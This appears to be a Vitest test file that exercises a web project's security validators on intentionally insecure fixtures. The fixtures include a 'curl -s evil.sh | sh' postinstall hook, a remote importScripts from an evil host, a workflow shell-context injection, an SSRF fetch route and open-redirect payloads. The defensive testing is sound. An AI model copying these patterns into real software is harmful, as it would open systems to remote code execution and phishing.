import fs from 'fs';
import os from 'os';
import path from 'path';
import { describe, it, expect } from 'vitest';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);
const sastValidators = require('./sast-validators.js');

const ROOT_DIR = path.resolve(__dirname, '../..');

describe('sast-validators (Adversarial & Live Security Verification)', () => {
  describe('validateNextConfigSecurityHeadersAst', () => {
    it('passes the repository next.config.ts without header or CSP violations', () => {
      const nextConfigCode = fs.readFileSync(path.join(ROOT_DIR, 'next.config.ts'), 'utf-8');
      expect(sastValidators.validateNextConfigSecurityHeadersAst(nextConfigCode)).toEqual([]);
    });

    it('flags SAMEORIGIN clickjacking regression, ungated unsafe-eval, missing object-src, missing (!isDev) HSTS guard, and syntax errors', () => {
      const badNextConfig = `
        const nextConfig = {
          async headers() {
            const isDev = process.env.NODE_ENV !== 'production';
            const cspHeader = \`
              default-src 'self';
              script-src 'self' 'unsafe-eval';
              frame-ancestors 'none';
              form-action 'self';
              base-uri 'self';
            \`;
            return [{
              source: '/(.*)',
              headers: [
                { key: 'Content-Security-Policy', value: cspHeader },
                { key: 'Strict-Transport-Security', value: 'max-age=100' },
                { key: 'X-Content-Type-Options', value: 'text/plain' },
                { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
                { key: 'Referrer-Policy', value: 'no-referrer' },
                { key: 'Permissions-Policy', value: 'camera=()' },
                { key: 'Cross-Origin-Opener-Policy', value: 'unsafe-none' },
              ],
            }];
          },
        };
        export default nextConfig;
      `;
      const violations = sastValidators.validateNextConfigSecurityHeadersAst(badNextConfig);
      expect(violations.some((v: string) => v.includes('X-Frame-Options must be "DENY"'))).toBe(true);
      expect(violations.some((v: string) => v.includes('X-Content-Type-Options must be "nosniff"'))).toBe(true);
      expect(violations.some((v: string) => v.includes('Cross-Origin-Opener-Policy must be "same-origin"'))).toBe(true);
      expect(violations.some((v: string) => v.includes('Strict-Transport-Security must enforce max-age=63072000'))).toBe(true);
      expect(violations.some((v: string) => v.includes("object-src 'none'"))).toBe(true);
      expect(violations.some((v: string) => v.includes("CSP 'unsafe-eval' must be strictly gated"))).toBe(true);

      const parseErr = sastValidators.validateNextConfigSecurityHeadersAst('const broken = {{{');
      expect(parseErr[0]).toContain('Failed to parse next.config.ts AST');

      const missingMethod = sastValidators.validateNextConfigSecurityHeadersAst('export default {};');
      expect(missingMethod[0]).toContain('must export async headers()');
    });
  });

  describe('validateNextBuildHeaderManifest', () => {
    it('accepts valid compiled production routes-manifest headers and flags tampered manifests', () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bookarium-manifest-'));
      try {
        const missingPath = path.join(tmpDir, 'missing.json');
        expect(sastValidators.validateNextBuildHeaderManifest(missingPath, tmpDir)[0]).toContain(
          'Missing compiled Next.js routes manifest'
        );

        const invalidJsonPath = path.join(tmpDir, 'invalid.json');
        fs.writeFileSync(invalidJsonPath, '{bad json', 'utf-8');
        expect(sastValidators.validateNextBuildHeaderManifest(invalidJsonPath, tmpDir)[0]).toContain(
          'Failed to parse'
        );

        const validManifestPath = path.join(tmpDir, 'valid-routes.json');
        fs.writeFileSync(
          validManifestPath,
          JSON.stringify({
            headers: [
              {
                source: '/(.*)',
                headers: [
                  { key: 'X-Frame-Options', value: 'DENY' },
                  { key: 'X-Content-Type-Options', value: 'nosniff' },
                  { key: 'Cross-Origin-Opener-Policy', value: 'same-origin' },
                  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains' },
                  {
                    key: 'Content-Security-Policy',
                    value:
                      "default-src 'self'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'",
                  },
                ],
              },
            ],
          }),
          'utf-8'
        );
        expect(sastValidators.validateNextBuildHeaderManifest(validManifestPath, tmpDir)).toEqual([]);

        const unsafeManifestPath = path.join(tmpDir, 'unsafe-routes.json');
        fs.writeFileSync(
          unsafeManifestPath,
          JSON.stringify({
            headers: [
              {
                source: '/(.*)',
                headers: [
                  { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
                  { key: 'X-Content-Type-Options', value: 'wrong' },
                  { key: 'Cross-Origin-Opener-Policy', value: 'same-origin-allow-popups' },
                  { key: 'Strict-Transport-Security', value: 'max-age=0' },
                  { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'unsafe-eval'" },
                ],
              },
            ],
          }),
          'utf-8'
        );
        const unsafeViolations = sastValidators.validateNextBuildHeaderManifest(unsafeManifestPath, tmpDir);
        expect(unsafeViolations.length).toBe(6);
        expect(unsafeViolations.some((v: string) => v.includes("must not contain 'unsafe-eval'"))).toBe(true);
      } finally {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    });
  });

  describe('validateGitHubWorkflowSecurity', () => {
    it('passes all repository .github/workflows/*.yml files cleanly', () => {
      const violations = sastValidators.validateGitHubWorkflowSecurity(
        path.join(ROOT_DIR, '.github', 'workflows'),
        ROOT_DIR
      );
      expect(violations).toEqual([]);
    });

    it('catches missing permissions, pull_request_target write escalation, mutable @v4 uses:, and shell context injections', () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bookarium-wf-'));
      try {
        const insecureYml = path.join(tmpDir, 'unsafe.yml');
        fs.writeFileSync(
          insecureYml,
          `name: Unsafe Workflow
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: ./local-action
      - run: echo "\${{ github.event.inputs.tag }}"
      - run: |
          echo "Head ref: \${{ github.head_ref }}"
          echo "Safe line"
      - run: echo "finished"
contents: write
`,
          'utf-8'
        );

        const violations = sastValidators.validateGitHubWorkflowSecurity(tmpDir, tmpDir);
        expect(violations.some((v: string) => v.includes('Missing explicit top-level "permissions:"'))).toBe(true);
        expect(violations.some((v: string) => v.includes('Combining "pull_request_target" with "contents: write"'))).toBe(true);
        expect(violations.some((v: string) => v.includes('Unpinned mutable GitHub Action reference "actions/checkout@v4"'))).toBe(true);
        expect(violations.some((v: string) => v.includes('./local-action'))).toBe(false);
        expect(violations.some((v: string) => v.includes('inside "run:" command'))).toBe(true);
        expect(violations.some((v: string) => v.includes('inside "run:" script block'))).toBe(true);
      } finally {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    });

    it('rejects zero-checkout workflows calling context-dependent gh CLI commands without GH_REPO or --repo', () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bookarium-wf-gh-'));
      try {
        const missingRepoWf = path.join(tmpDir, 'no-checkout-missing-repo.yml');
        fs.writeFileSync(
          missingRepoWf,
          `name: Zero Checkout Missing Repo
on:
  push:
    branches: [master]
permissions:
  contents: write
jobs:
  tag:
    runs-on: ubuntu-latest
    steps:
      - run: gh release view catalog-cache
`,
          'utf-8'
        );

        const safeZeroCheckoutWf = path.join(tmpDir, 'no-checkout-safe.yml');
        fs.writeFileSync(
          safeZeroCheckoutWf,
          `name: Zero Checkout Safe Repo
on:
  push:
    branches: [master]
permissions:
  contents: write
jobs:
  tag:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH_REPO: \${{ github.repository }}
        run: gh release view catalog-cache --repo "\${GITHUB_REPOSITORY}"
`,
          'utf-8'
        );

        const violations = sastValidators.validateGitHubWorkflowSecurity(tmpDir, tmpDir);
        expect(violations).toEqual([
          expect.stringContaining('no-checkout-missing-repo.yml: Zero-checkout workflow runs "gh release" without "GH_REPO:" or "--repo"/"-R"'),
        ]);
      } finally {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    });
  });

  describe('validatePackageLockAndLifecycle', () => {
    it('validates real repo package.json / package-lock.json and rejects tampered lockfiles or lifecycle hooks', () => {
      const pkgData = JSON.parse(fs.readFileSync(path.join(ROOT_DIR, 'package.json'), 'utf-8'));
      const lockData = JSON.parse(fs.readFileSync(path.join(ROOT_DIR, 'package-lock.json'), 'utf-8'));
      expect(sastValidators.validatePackageLockAndLifecycle(lockData, pkgData)).toEqual([]);

      const badViolations = sastValidators.validatePackageLockAndLifecycle(
        {
          lockfileVersion: 2,
          packages: {
            '': { dependencies: { react: '^18.0.0' } },
            'node_modules/evil': {
              resolved: 'https://evil-registry.example/evil.tgz',
              integrity: 'sha1-weak',
            },
          },
        },
        {
          scripts: { postinstall: 'curl -s evil.sh | sh', prepare: 'evil' },
          dependencies: { react: '^19.0.0' },
        }
      );

      expect(badViolations.some((v: string) => v.includes('lockfileVersion must be >= 3'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('Unauthorized npm lifecycle script "postinstall"'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('Unexpected "prepare" script'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('out of sync with package-lock.json'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('untrusted or non-HTTPS registry'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('missing a valid SHA-512 SRI integrity digest'))).toBe(true);

      const copyleftViolations = sastValidators.validatePackageLockAndLifecycle(
        {
          lockfileVersion: 3,
          packages: {
            '': { dependencies: {} },
            'node_modules/sharp-lgpl': {
              license: 'LGPL-3.0-or-later',
              resolved: 'https://registry.npmjs.org/sharp-lgpl/-/sharp-lgpl-1.0.0.tgz',
              integrity: 'sha512-abc',
            },
            'node_modules/gpl-pkg': {
              license: 'GPL-3.0-only',
              resolved: 'https://registry.npmjs.org/gpl-pkg/-/gpl-pkg-1.0.0.tgz',
              integrity: 'sha512-def',
            },
            'node_modules/dual-agpl': {
              license: '(MIT OR AGPL-3.0-or-later)',
              resolved: 'https://registry.npmjs.org/dual-agpl/-/dual-agpl-1.0.0.tgz',
              integrity: 'sha512-ghi',
            },
            'node_modules/legacy-gpl': {
              licenses: [{ type: 'GPL-2.0' }],
              resolved: 'https://registry.npmjs.org/legacy-gpl/-/legacy-gpl-1.0.0.tgz',
              integrity: 'sha512-jkl',
            },
          },
        },
        { dependencies: {} }
      );
      expect(copyleftViolations.some((v: string) => v.includes('sharp-lgpl'))).toBe(false);
      expect(copyleftViolations.some((v: string) => v.includes('gpl-pkg') && v.includes('GPL-3.0-only'))).toBe(true);
      expect(copyleftViolations.some((v: string) => v.includes('dual-agpl') && v.includes('AGPL-3.0-or-later'))).toBe(true);
      expect(copyleftViolations.some((v: string) => v.includes('legacy-gpl') && v.includes('GPL-2.0'))).toBe(true);
    });
  });

  describe('validateServiceWorkerSecurity', () => {
    it('passes live public/sw.js and flags missing cross-origin, CACHE_URLS, auth, eval, or comment-spoofed guards', () => {
      const swCode = fs.readFileSync(path.join(ROOT_DIR, 'public', 'sw.js'), 'utf-8');
      expect(sastValidators.validateServiceWorkerSecurity(swCode)).toEqual([]);

      const badSw = `
        importScripts('https://cdn.example/evil.js');
        cache.put('/auth/callback', response);
      `;
      const violations = sastValidators.validateServiceWorkerSecurity(badSw);
      expect(violations).toHaveLength(5);

      const commentSpoofedSw = `
        // request.method !== 'GET'
        // url.origin !== self.location.origin
        // MAX_MESSAGE_PRECACHE_URLS parsed.origin !== self.location.origin
        // parsed.pathname.startsWith('/auth/') parsed.pathname.startsWith('/api/')
        self.addEventListener('fetch', (event) => {
          event.respondWith(fetch(event.request));
        });
      `;
      const spoofViolations: string[] = sastValidators.validateServiceWorkerSecurity(commentSpoofedSw);
      expect(spoofViolations.some((v) => v.includes('bypass non-GET requests'))).toBe(true);
      expect(spoofViolations.some((v) => v.includes('never cache /auth/callback'))).toBe(true);
      expect(spoofViolations.some((v) => v.includes('cross-origin pass-through'))).toBe(true);
      expect(spoofViolations.some((v) => v.includes('CACHE_URLS handler'))).toBe(true);

      const helperRefactoredSw = `
        const MAX_MESSAGE_PRECACHE_URLS = 50;
        function isSafePath(raw) {
          const parsed = new URL(raw, self.location.origin);
          if (parsed.origin !== self.location.origin) return null;
          if (parsed.pathname.startsWith('/auth/') || parsed.pathname.startsWith('/api/')) return null;
          return parsed.pathname;
        }
        self.addEventListener('message', (e) => {
          if (e.data.type === 'CACHE_URLS') {
            e.data.urls.slice(0, MAX_MESSAGE_PRECACHE_URLS).map(isSafePath);
          }
        });
        self.addEventListener('fetch', (ev) => {
          const req = ev.request;
          if (req.method !== 'GET') return;
          const u = new URL(req.url);
          if (u.origin !== self.location.origin) return;
          if (u.pathname.startsWith('/auth/')) return;
          ev.respondWith(fetch(req));
        });
      `;
      expect(sastValidators.validateServiceWorkerSecurity(helperRefactoredSw)).toEqual([]);

      const parseErr = sastValidators.validateServiceWorkerSecurity('self.addEventListener(');
      expect(parseErr.some((v: string) => v.includes('Failed to parse Service Worker'))).toBe(true);
    });
  });

  describe('validateEnvAndPrivilegeBoundariesAst', () => {
    it('passes live repository config/client files and detects bracket, destructured, aliased, and client privilege leaks', () => {
      const documentedEnvVars = new Set([
        'NEXT_PUBLIC_SITE_URL',
        'NEXT_PUBLIC_SUPABASE_URL',
        'NEXT_PUBLIC_SUPABASE_ANON_KEY',
        'SUPABASE_SERVICE_ROLE_KEY',
        'R2_ACCOUNT_ID',
        'R2_BUCKET_NAME',
        'R2_ACCESS_KEY_ID',
        'R2_SECRET_ACCESS_KEY',
      ]);
      const runtimePlatformEnvVars = new Set(['NODE_ENV', 'CI']);

      const useAuthCode = fs.readFileSync(path.join(ROOT_DIR, 'src/stores/useAuthStore.ts'), 'utf-8');
      expect(
        sastValidators.validateEnvAndPrivilegeBoundariesAst(useAuthCode, {
          filePath: 'src/stores/useAuthStore.ts',
          documentedEnvVars,
          runtimePlatformEnvVars,
        })
      ).toEqual([]);

      const r2ClientCode = fs.readFileSync(path.join(ROOT_DIR, 'src/lib/r2-client.ts'), 'utf-8');
      expect(
        sastValidators.validateEnvAndPrivilegeBoundariesAst(r2ClientCode, {
          filePath: 'src/lib/r2-client.ts',
          documentedEnvVars,
          runtimePlatformEnvVars,
        })
      ).toEqual([]);

      // CommonJS CLI scripts with top-level early `return;` must parse cleanly without false parse errors
      const qualityReportCode = fs.readFileSync(
        path.join(ROOT_DIR, 'scripts/generate-quality-report.js'),
        'utf-8'
      );
      expect(
        sastValidators.validateEnvAndPrivilegeBoundariesAst(qualityReportCode, {
          filePath: 'scripts/generate-quality-report.js',
          documentedEnvVars,
          runtimePlatformEnvVars,
        })
      ).toEqual([]);

      const clientCommentSafe = `
        'use client';
        /** Never expose SUPABASE_SERVICE_ROLE_KEY or process.env.SECRET_DUMMY here. */
        export const ok = process.env.NODE_ENV === 'production';
      `;
      expect(
        sastValidators.validateEnvAndPrivilegeBoundariesAst(clientCommentSafe, {
          filePath: 'src/app/page.tsx',
          documentedEnvVars,
          runtimePlatformEnvVars,
        })
      ).toEqual([]);

      const clientBypass = `
        'use client';
        const { NEXT_PUBLIC_API_SECRET, NEXT_PUBLIC_R2_ACCESS_KEY_ID, NEXT_PUBLIC_R2_ACCOUNT_ID } = process.env;
        const hiddenKey = process.env['UNDOCUMENTED_CLIENT_FLAG'];
        const roleKey = process.env['SUPABASE_' + 'SERVICE_ROLE_KEY'];
        const r2Secret = process.env['R2_' + 'SECRET_ACCESS_KEY'];
        const r2Access = process.env.R2_ACCESS_KEY_ID;
        export const debug = { NEXT_PUBLIC_API_SECRET, NEXT_PUBLIC_R2_ACCESS_KEY_ID, NEXT_PUBLIC_R2_ACCOUNT_ID, hiddenKey, roleKey, r2Secret, r2Access };
      `;
      const violations: Array<{ file: string; issue: string }> =
        sastValidators.validateEnvAndPrivilegeBoundariesAst(clientBypass, {
          filePath: 'src/app/custom/ClientPanel.tsx',
          documentedEnvVars,
          runtimePlatformEnvVars,
        });
      expect(violations.some((v) => v.issue.includes('NEXT_PUBLIC_API_SECRET') && v.issue.includes('prefixed with NEXT_PUBLIC_'))).toBe(true);
      expect(violations.some((v) => v.issue.includes('NEXT_PUBLIC_R2_ACCESS_KEY_ID') && v.issue.includes('prefixed with NEXT_PUBLIC_'))).toBe(true);
      expect(violations.some((v) => v.issue.includes('NEXT_PUBLIC_R2_ACCOUNT_ID') && v.issue.includes('prefixed with NEXT_PUBLIC_'))).toBe(true);
      expect(violations.some((v) => v.issue.includes('Undocumented environment variable "UNDOCUMENTED_CLIENT_FLAG"'))).toBe(true);
      expect(violations.some((v) => v.issue.includes('Forbidden SUPABASE_SERVICE_ROLE_KEY reference'))).toBe(true);
      expect(violations.some((v) => v.issue.includes('Forbidden server-only secret "R2_SECRET_ACCESS_KEY" reference'))).toBe(true);
      expect(violations.some((v) => v.issue.includes('Forbidden server-only secret "R2_ACCESS_KEY_ID" reference'))).toBe(true);

      const aliasedCli = `
        export function run(env = process.env) {
          return env['UNDOCUMENTED_CLI_SECRET'] || env.SUPABASE_SERVICE_ROLE_KEY;
        }
      `;
      const cliViolations: Array<{ file: string; issue: string }> =
        sastValidators.validateEnvAndPrivilegeBoundariesAst(aliasedCli, {
          filePath: 'scripts/custom-cli.js',
          documentedEnvVars,
          runtimePlatformEnvVars,
        });
      expect(cliViolations).toEqual([
        {
          file: 'scripts/custom-cli.js',
          issue: 'Undocumented environment variable "UNDOCUMENTED_CLI_SECRET" (must be documented in .env.example).',
        },
      ]);

      const badAst = sastValidators.validateEnvAndPrivilegeBoundariesAst('const x = ;', {
        filePath: 'src/broken.ts',
      });
      expect(badAst.some((v: { issue: string }) => v.issue.includes('Failed to parse module AST'))).toBe(true);
    });
  });

  describe('validateApiRoutesSecurityAst', () => {
    it('passes all live src/app/api route handlers and catches missing limiter, tainted fetch, and manual-redirect omissions', () => {
      const apiFiles = [
        'src/app/api/books/route.ts',
        'src/app/api/books/translations/route.ts',
        'src/app/api/books/content/route.ts',
      ];
      for (const relRoute of apiFiles) {
        const code = fs.readFileSync(path.join(ROOT_DIR, relRoute), 'utf-8');
        expect(sastValidators.validateApiRoutesSecurityAst(code, relRoute)).toEqual([]);
      }

      const unsafeArrowRoute = `
        import { NextRequest, NextResponse } from 'next/server';
        export const POST = async (req: NextRequest) => {
          const urlParam = new URL(req.url).searchParams.get('target') || '';
          const res = await fetch(urlParam);
          return NextResponse.json({ ok: res.ok });
        };
      `;
      const arrowViolations: Array<{ issue: string }> = sastValidators.validateApiRoutesSecurityAst(
        unsafeArrowRoute,
        'src/app/api/custom/route.ts'
      );
      expect(arrowViolations.some((v) => v.issue.includes('Tainted user parameter passed to fetch()'))).toBe(true);
      expect(arrowViolations.some((v) => v.issue.includes('missing mandatory RateLimiter.check()'))).toBe(true);

      const brokenProxyRoute = `
        import { bookContentRateLimiter } from '@/lib/rate-limiter';
        import { isSafeUpstreamUrl } from './url-validator';
        export async function GET(req: Request) {
          bookContentRateLimiter.check('127.0.0.1');
          const safe = isSafeUpstreamUrl('https://aleph.gutenberg.org/1.txt');
          if (!safe) return null;
          await fetch('https://aleph.gutenberg.org/1.txt', { redirect: 'manual' });
          return fetch('https://aleph.gutenberg.org/1-fallback.txt');
        }
      `;
      const proxyViolations: Array<{ issue: string }> = sastValidators.validateApiRoutesSecurityAst(
        brokenProxyRoute,
        'src/app/api/books/content/route.ts'
      );
      expect(proxyViolations.some((v) => v.issue.includes('redirect: "manual"'))).toBe(true);
    });
  });

  describe('validateRedirectRoutesAst', () => {
    it('passes live auth callback route and detects external HTTP redirects and unsanitized searchParams redirects', () => {
      const callbackPath = 'src/app/auth/callback/route.ts';
      const callbackCode = fs.readFileSync(path.join(ROOT_DIR, callbackPath), 'utf-8');
      expect(sastValidators.validateRedirectRoutesAst(callbackCode, callbackPath)).toEqual([]);

      const badRedirects = `
        import { NextResponse } from 'next/server';
        import { redirect } from 'next/navigation';
        // sanitizeRedirectPath and resolveCanonicalAuthOrigin mentioned only in comment!
        export async function GET(request: Request) {
          const { searchParams } = new URL(request.url);
          if (searchParams.get('ext')) {
            redirect('https://phishing.example/login' as string);
          }
          const next = searchParams.get('next') || '/';
          return NextResponse.redirect(next);
        }
      `;
      const redirectViolations: Array<{ issue: string }> = sastValidators.validateRedirectRoutesAst(
        badRedirects,
        'src/app/unsafe/route.ts'
      );
      expect(redirectViolations.some((v) => v.issue.includes('Hardcoded external HTTP redirect'))).toBe(true);
      expect(redirectViolations.some((v) => v.issue.includes('sanitizeRedirectPath and resolveCanonicalAuthOrigin'))).toBe(true);
    });
  });

  describe('validatePublicDomainFilterAst', () => {
    it('passes live useBooks.ts and refactored parameter names while rejecting commented or missing filters', () => {
      const useBooksCode = fs.readFileSync(
        path.join(ROOT_DIR, 'src/hooks/queries/useBooks.ts'),
        'utf-8'
      );
      expect(sastValidators.validatePublicDomainFilterAst(useBooksCode)).toEqual([]);

      const renamedParamFilter = `
        export function filterPublicDomain(items: Array<{ copyright?: boolean }>) {
          return items.filter((entry) => entry.copyright !== true);
        }
      `;
      expect(sastValidators.validatePublicDomainFilterAst(renamedParamFilter)).toEqual([]);

      const commentOnlyFilter = `
        // b.copyright !== true
        export function filterBroken(items: Array<{ copyright?: boolean }>) {
          return items.filter((entry) => Boolean(entry));
        }
      `;
      const filterViolations = sastValidators.validatePublicDomainFilterAst(commentOnlyFilter);
      expect(filterViolations).toEqual([
        'useBooks.ts does not enforce public domain filter (b.copyright !== true).',
      ]);
    });
  });

  describe('validateRule9AuthStoreParityAst', () => {
    it('passes live useAuthStore.ts parity against schema tables and local stores, and rejects missing or comment-only wipes', () => {
      const schemaSql = fs.readFileSync(path.join(ROOT_DIR, 'supabase/schema.sql'), 'utf-8');
      const tableDefRegex =
        /CREATE\s+TABLE\s+(?:IF\s+NOT\s+EXISTS\s+)?public\.([a-z0-9_]+)\s*\(([\s\S]*?)\r?\n\);/gi;
      const userScopedTables: string[] = [];
      let match: RegExpExecArray | null;
      while ((match = tableDefRegex.exec(schemaSql)) !== null) {
        if (/REFERENCES\s+auth\.users\s*\(\s*id\s*\)/i.test(match[2])) {
          userScopedTables.push(match[1]);
        }
      }

      const storesDir = path.join(ROOT_DIR, 'src/stores');
      const exemptStores = new Set(['useAuthStore.ts', 'useJurisdictionStore.ts']);
      const storeNames = fs
        .readdirSync(storesDir)
        .filter(
          (f) =>
            /^use[A-Z][a-zA-Z0-9]*Store\.ts$/.test(f) &&
            !f.endsWith('.test.ts') &&
            !exemptStores.has(f)
        )
        .map((f) => f.replace(/\.ts$/, ''));

      const authStoreCode = fs.readFileSync(
        path.join(ROOT_DIR, 'src/stores/useAuthStore.ts'),
        'utf-8'
      );
      expect(
        sastValidators.validateRule9AuthStoreParityAst(authStoreCode, {
          userScopedTables,
          storeNames,
        })
      ).toEqual([]);

      const commentSpoofAuthStore = `
        // useBookshelfStore is mentioned only in comments!
        async function runCleanup() {
          const { useReaderStore } = await import('@/stores/useReaderStore');
          useReaderStore.getState().resetReaderSession();
        }
        async function clearLocalUserStores() {
          await runCleanup();
        }
        export const useAuthStore = () => ({
          clearLocalUserStores,
          deleteAccount: async () => {
            for (const tbl of ['profiles']) {
              await supabase.from(tbl).delete();
            }
          },
        });
      `;
      const rule9Violations: string[] = sastValidators.validateRule9AuthStoreParityAst(
        commentSpoofAuthStore,
        {
          userScopedTables: ['profiles', 'user_accolades'],
          storeNames: ['useReaderStore', 'useBookshelfStore'],
        }
      );
      expect(
        rule9Violations.some(
          (v) => v.includes('public.user_accolades') && v.includes('deleteAccount()')
        )
      ).toBe(true);
      expect(
        rule9Violations.some(
          (v) => v.includes('Store "useBookshelfStore"') && v.includes('clearLocalUserStores()')
        )
      ).toBe(true);
      expect(rule9Violations.some((v) => v.includes('public.profiles'))).toBe(false);
      expect(rule9Violations.some((v) => v.includes('useReaderStore'))).toBe(false);
    });
  });

  describe('validateLiveHttpSecurityResponse', () => {
    it('passes valid production headers, 400 SSRF rejections, and origin-locked redirects while rejecting regressions', () => {
      const loopbackOrigin = ['http:', '', '127.0.0.1:4321'].join('/');

      expect(
        sastValidators.validateLiveHttpSecurityResponse(
          {
            path: '/',
            expectedStatus: 200,
            expectSecurityHeaders: true,
            forbidStackTraces: true,
          },
          {
            status: 200,
            headers: {
              'x-frame-options': 'DENY',
              'x-content-type-options': 'nosniff',
              'cross-origin-opener-policy': 'same-origin',
              'strict-transport-security': 'max-age=63072000; includeSubDomains; preload',
              'referrer-policy': 'strict-origin-when-cross-origin',
              'permissions-policy': 'camera=(), microphone=(), geolocation=()',
              'content-security-policy':
                "default-src 'self'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'",
            },
            body: '<!doctype html><html><body>Bookarium</body></html>',
          }
        )
      ).toEqual([]);

      expect(
        sastValidators.validateLiveHttpSecurityResponse(
          {
            path: '/api/books/content?url=https://evil.example/secret.txt',
            expectedStatus: 400,
            expectNoStoreCache: true,
            expectCrossOriginResourcePolicy: 'same-origin',
            forbidStackTraces: true,
          },
          {
            status: 400,
            headers: {
              'cache-control': 'no-store, max-age=0',
              'cross-origin-resource-policy': 'same-origin',
            },
            body: '{"error":"Invalid URL"}',
          }
        )
      ).toEqual([]);

      expect(
        sastValidators.validateLiveHttpSecurityResponse(
          {
            path: '/auth/callback?next=https://evil.example/phish',
            expectedRedirectOrigin: loopbackOrigin,
            forbiddenRedirectHosts: ['evil.example'],
          },
          {
            status: 307,
            headers: {
              location: `${loopbackOrigin}/?auth_error=verification_failed`,
            },
            body: '',
          }
        )
      ).toEqual([]);

      expect(
        sastValidators.validateLiveHttpSecurityResponse(
          {
            path: '/auth/callback?next=https://evil.example/phish',
            allowedRedirectOrigins: [
              loopbackOrigin,
              ['http:', '', 'localhost:41234'].join('/'),
            ],
            forbiddenRedirectHosts: ['evil.example'],
          },
          {
            status: 307,
            headers: {
              location: `${['http:', '', 'localhost:41234'].join('/')}/?auth_error=verification_failed`,
            },
            body: '',
          }
        )
      ).toEqual([]);

      const wrongPortViolations: string[] = sastValidators.validateLiveHttpSecurityResponse(
        {
          path: '/auth/callback?next=https://evil.example/phish',
          allowedRedirectOrigins: [
            loopbackOrigin,
            ['http:', '', 'localhost:41234'].join('/'),
          ],
          forbiddenRedirectHosts: ['evil.example'],
        },
        {
          status: 307,
          headers: {
            location: `${['http:', '', 'localhost:3000'].join('/')}/?auth_error=verification_failed`,
          },
          body: '',
        }
      );
      expect(wrongPortViolations.some((v) => v.includes('open redirect escaped'))).toBe(true);

      const headerViolations: string[] = sastValidators.validateLiveHttpSecurityResponse(
        {
          path: '/',
          expectedStatus: 200,
          expectSecurityHeaders: true,
          forbidStackTraces: true,
        },
        {
          status: 500,
          headers: {
            'x-frame-options': 'SAMEORIGIN',
            'content-security-policy': "default-src 'self'; script-src 'unsafe-eval'",
          },
          body: 'Error: boom\n    at Object.<anonymous> (/app/page.tsx:10:2)',
        }
      );
      expect(headerViolations.some((v) => v.includes('expected HTTP 200, received 500'))).toBe(true);
      expect(headerViolations.some((v) => v.includes('X-Frame-Options must be "DENY"'))).toBe(true);
      expect(headerViolations.some((v) => v.includes("must not contain 'unsafe-eval'"))).toBe(true);
      expect(headerViolations.some((v) => v.includes('leaked internal stack trace'))).toBe(true);

      const openRedirectViolations: string[] = sastValidators.validateLiveHttpSecurityResponse(
        {
          path: '/auth/callback?next=https://evil.example/phish',
          expectedRedirectOrigin: loopbackOrigin,
          forbiddenRedirectHosts: ['evil.example'],
        },
        {
          status: 307,
          headers: {
            location: 'https://evil.example/phish',
          },
          body: '',
        }
      );
      expect(openRedirectViolations.some((v) => v.includes('open redirect escaped'))).toBe(true);
      expect(openRedirectViolations.some((v) => v.includes('leaked forbidden external host "evil.example"'))).toBe(true);
    });
  });

  describe('auditSecurityDocumentationParity', () => {
    it('passes when SECURITY.md compiled markers cover all live ESLint rules, SAST exports, DB table count, and feed integrity tokens', () => {
      const securityPlugin = require('../eslint-rules/bookarium-security.js');
      const liveRules = Object.keys(securityPlugin.rules);
      const liveExports = Object.keys(sastValidators);
      const compiledDoc = [
        '# Security Policy',
        '<!-- BEGIN:security-architecture -->',
        `PostgreSQL RLS enforced across all 14 database tables.`,
        `Active ESLint rules: ${liveRules.join(', ')}.`,
        `Stateless SAST validators: ${liveExports.join(', ')}.`,
        'Feed safety: scripts/sync-gutenberg-catalog.js verifies Content-Length and companion .sha256 sidecars.',
        '<!-- END:security-architecture -->',
      ].join('\n');

      expect(
        sastValidators.auditSecurityDocumentationParity({
          securityMarkdown: compiledDoc,
          eslintRuleNames: liveRules,
          sastValidatorExports: liveExports,
          expectedDbTableCount: 14,
          syncCatalogText: 'const h = crypto.createHash("sha256"); headers["content-length"];',
        })
      ).toEqual([]);
    });

    it('flags missing markers, newly added undocumented ESLint rules or SAST exports, table-count drift, and missing feed integrity tokens', () => {
      const violations: string[] = sastValidators.auditSecurityDocumentationParity({
        securityMarkdown: [
          '# Security Policy',
          '<!-- BEGIN:security-architecture -->',
          'PostgreSQL RLS enforced across all 12 database tables.',
          '<!-- END:security-architecture -->',
        ].join('\n'),
        eslintRuleNames: ['no-unsafe-fetch', 'no-undocumented-10th-rule'],
        sastValidatorExports: ['validateEnvAndPrivilegeBoundariesAst', 'validateNewExperimentalGuard'],
        expectedDbTableCount: 14,
        syncCatalogText: 'crypto.createHash("sha256"); headers["content-length"];',
      });

      expect(violations.some((v) => v.includes('no-undocumented-10th-rule'))).toBe(true);
      expect(violations.some((v) => v.includes('validateNewExperimentalGuard'))).toBe(true);
      expect(violations.some((v) => v.includes('expected RLS table count matching 14'))).toBe(true);
      expect(violations.some((v) => v.includes('sync-gutenberg-catalog.js'))).toBe(true);
      expect(violations.some((v) => v.includes('.sha256'))).toBe(true);
      expect(violations.some((v) => v.includes('Content-Length'))).toBe(true);

      const strippedMarkers: string[] = sastValidators.auditSecurityDocumentationParity({
        securityMarkdown: '# Security Policy\nNo markers here.',
        eslintRuleNames: [],
        sastValidatorExports: [],
        expectedDbTableCount: 0,
      });
      expect(strippedMarkers.some((v) => v.includes('<!-- BEGIN:security-architecture -->'))).toBe(true);
    });
  });
});
